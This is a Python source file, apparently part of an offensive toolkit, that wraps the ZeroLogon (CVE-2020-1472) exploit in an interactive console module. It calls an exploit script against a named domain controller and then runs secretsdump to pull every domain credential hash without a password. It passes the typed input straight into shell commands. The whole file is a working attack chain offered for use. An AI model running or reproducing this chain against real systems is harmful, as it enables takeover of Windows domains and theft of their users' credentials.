import subprocess
import time


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    green = '\033[0;32m'
    end = '\033[m'


class ZeroLogon(object):
    def __init__(self, netbios_hostname, domain_controller_ip, ):
        self.domain_controller_ip = domain_controller_ip
        self.netbios_hostname = netbios_hostname

    def send_zero_logon(self):
        subprocess.call(
            f"python3 CVE-2020-1472/cve-2020-1472-exploit.py {self.netbios_hostname} {self.domain_controller_ip}",
            shell=True)

    def dump_hashes(self, timeout):
        subprocess.call(
            f"python3 secretdump.py -just-dc -no-pass {self.netbios_hostname}\$@{self.domain_controller_ip}", shell=True)
        time.sleep(int(timeout))


options = \
    f"""
{Colors.red}Variables                 Description                    Needed{Colors.end}
---------                 -----------                    ------
netbios_hostname          hostname of domain controller    yes
target_ip_address         domain controller ip address     yes

(Example):
    1. set netbios_hostname dark
    2. set target_ip_address 192.168.0.1
    3. run / exploit"""
if __name__ == "__main__":
    while True:
        try:
            module = input(f"{Colors.red}(ZeroLogon Microsoft Netlogon){Colors.end} [ZeroLogon Module]:~#")
            if module == "options" or module == "help":
                print(options)
            if module[:21] == "set netbios_hostname ":
                hostname_var = module[21:]
                print(f"set netbios hostname: {Colors.red}{hostname_var}{Colors.end}")
            elif module[:22] == "set target_ip_address ":
                ip_var = module[22:]
                print(f"set target ip address: {Colors.red}{ip_var}{Colors.end}")

            def run_exploit(hostname, ip_address):
                attack = ZeroLogon(
                    netbios_hostname=hostname,
                    domain_controller_ip=ip_address
                )
                attack.send_zero_logon()
                attack.dump_hashes(timeout=4)


            if module == "run" or module == "exploit":
                run_exploit(hostname=hostname_var, ip_address=ip_var)
                break
        except KeyboardInterrupt:
            break
